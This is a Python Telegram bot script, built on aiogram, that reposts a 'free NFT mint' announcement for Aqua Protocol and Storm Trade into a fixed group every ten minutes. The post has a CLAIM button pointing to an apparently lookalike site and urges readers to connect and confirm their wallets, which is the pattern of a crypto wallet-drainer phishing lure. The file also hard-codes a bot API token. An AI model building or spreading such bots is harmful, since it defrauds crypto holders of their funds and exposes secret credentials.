import logging
from aiogram import Bot, Dispatcher
from aiogram.types import BotCommand
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.filters import Command
import time
import asyncio
from aiogram import types, Router, Bot
from aiogram.types import InlineKeyboardButton, FSInputFile
from aiogram.utils.keyboard import InlineKeyboardBuilder

# Configure logging
logging.basicConfig(level=logging.INFO)

API_TOKEN = "7371489820:AAE2VXZou_gfb9mrylWZoCRh8ERLorj6YWA"
GROUP_ID = -1001819113304
MESSAGE_ID = 0
# Initialize bot and dispatcher
bot = Bot(token=API_TOKEN)
dp = Dispatcher(storage=MemoryStorage())


router = Router()


text = """
Free minting of NFTs from Aqua Protocol and Storm Trade:

✅ Click on the "Mint NFT" button below.
✅ Link the wallet with the our site.
✅ Confirm minting in wallet.


- Ensure your wallet is active (has both incoming and outgoing transactions in the last month; without outgoing transactions, it is considered inactive in the system).
- Activate your wallet with an outgoing transaction. After 24 hours, you will be able to mint your score.
"""


@router.message(Command("start"))
async def send_new_post(message: types.Message, bot: Bot):
    global MESSAGE_ID, GROUP_ID

    min10inSec = 60 * 10

    keyboard_builder = InlineKeyboardBuilder()
    keyboard_builder.add(
        InlineKeyboardButton(
            text="CLAIM",
            url="https://aquaprotocol.pro/",
        )
    )
    keyboard = keyboard_builder.as_markup()

    photo = FSInputFile("imageAqua.jpg")

    if MESSAGE_ID == 0:

        message1 = await bot.send_photo(
            GROUP_ID,
            photo=photo,
            caption=text,
            reply_markup=keyboard,
        )

        MESSAGE_ID = message1.message_id

        await asyncio.sleep(min10inSec)
        await send_new_post(message, bot)
        return

    await bot.delete_message(chat_id=GROUP_ID, message_id=MESSAGE_ID)

    message1 = await bot.send_photo(
        GROUP_ID,
        photo=photo,
        caption=text,
        reply_markup=keyboard,
    )

    MESSAGE_ID = message1.message_id

    await asyncio.sleep(min10inSec)
    await send_new_post(message, bot)


dp.include_router(router)


async def main():
    await dp.start_polling(bot)


if __name__ == "__main__":
    import asyncio

    asyncio.run(main())
